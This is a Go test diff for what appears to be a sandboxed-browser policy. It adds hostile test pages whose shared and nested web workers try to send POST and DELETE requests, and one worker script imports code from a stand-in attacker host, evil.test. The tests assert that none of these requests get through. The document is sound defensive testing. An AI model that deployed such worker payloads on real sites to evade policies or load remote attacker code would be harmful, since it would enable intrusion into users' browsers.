@@ -124,6 +124,35 @@ var src = "fetch('/worker-post', {method: 'POST', body: 'x'}).catch(function(){}
   "try { new WebSocket('ws://app.test/worker-ws'); } catch (e) {}";
 try { new Worker(URL.createObjectURL(new Blob([src], {type: 'text/javascript'}))); } catch (e) {}
 </script>`))
+		case "/shared-worker":
+			// A shared worker outlives its page: refused by policy.
+			w.Header().Set("Content-Type", "text/html")
+			_, _ = w.Write([]byte(`<title>Shared worker</title><h1>shared</h1><script>
+var src = "fetch('/shared-post', {method: 'POST', body: 'x'}).catch(function(){});" +
+  "fetch('http://app.test/shared-delete', {method: 'DELETE'}).catch(function(){});";
+try { new SharedWorker(URL.createObjectURL(new Blob([src], {type: 'text/javascript'}))).port.start(); } catch (e) {}
+try { new SharedWorker('/shared-worker.js').port.start(); } catch (e) {}
+</script>`))
+		case "/shared-worker.js":
+			w.Header().Set("Content-Type", "text/javascript")
+			_, _ = w.Write([]byte(`fetch('/shared-url-delete', {method: 'DELETE'}).catch(function(){});`))
+		case "/nested-worker":
+			// A worker that starts a worker of its own, from a blob and from
+			// a URL of the target.
+			w.Header().Set("Content-Type", "text/html")
+			_, _ = w.Write([]byte(`<title>Nested worker</title><h1>nested</h1><script>
+var inner = "fetch('http://app.test/nested-delete', {method: 'DELETE'}).catch(function(){});";
+var outer = "var inner = " + JSON.stringify(inner) + ";" +
+  "try { new Worker(URL.createObjectURL(new Blob([inner], {type: 'text/javascript'}))); } catch (e) {}" +
+  "try { new Worker('http://app.test/worker.js'); } catch (e) {}" +
+  "fetch('http://app.test/outer-delete', {method: 'DELETE'}).catch(function(){});";
+try { new Worker(URL.createObjectURL(new Blob([outer], {type: 'text/javascript'}))); } catch (e) {}
+try { new Worker('/worker.js'); } catch (e) {}
+</script>`))
+		case "/worker.js":
+			w.Header().Set("Content-Type", "text/javascript")
+			_, _ = w.Write([]byte(`fetch('/url-worker-delete', {method: 'DELETE'}).catch(function(){});` +
+				`try { importScripts('http://evil.test/import.js'); } catch (e) {}`))
 		case "/iframe-ws":
 			// A WebSocket opened from the realm of a nested frame.
 			w.Header().Set("Content-Type", "text/html")
@@ -271,10 +300,11 @@ func TestRealBrowserHostilePage(t *testing.T) {
 	}
 }
 
-// SECURITY: requests a page's workers and nested frames make are held to
-// the same policy as the page's own: a worker created from a blob cannot
-// POST (or use another method), and a WebSocket opened from an iframe's
-// realm never connects.
+// SECURITY: a page's workers and nested frames get no way around the
+// page's policy: a worker (dedicated from a blob or a URL, nested, or
+// shared) never runs its script, so it cannot POST, DELETE or import a
+// script from elsewhere, not even while its page closes; a WebSocket opened
+// from an iframe's realm never connects.
 func TestRealBrowserWorkerAndFrameRealms(t *testing.T) {
 	bin := realBrowser(t)
 	for _, c := range []struct {
@@ -282,6 +312,8 @@ func TestRealBrowserWorkerAndFrameRealms(t *testing.T) {
 		never      []string
 	}{
 		{"blob worker", "/blob-worker", []string{"/worker-post", "/worker-delete", "/worker-ws"}},
+		{"shared worker", "/shared-worker", []string{"/shared-post", "/shared-delete", "/shared-url-delete"}},
+		{"nested worker", "/nested-worker", []string{"/nested-delete", "/outer-delete", "/url-worker-delete"}},
 		{"iframe websocket", "/iframe-ws", []string{"/frame-ws", "/frame-ws2"}},
 	} {
 		t.Run(c.name, func(t *testing.T) {
@@ -291,6 +323,9 @@ func TestRealBrowserWorkerAndFrameRealms(t *testing.T) {
 			for _, s := range f.requests() {
 				if s.Method != http.MethodGet && s.Method != http.MethodHead {
 					t.Errorf("%s %s reached the forwarder", s.Method, s.Path)
+				}
+				if s.Host != "app.test" {
+					t.Errorf("a request reached the forwarder for %s%s", s.Host, s.Path)
 				}
 				for _, p := range c.never {
 					if s.Path == p {
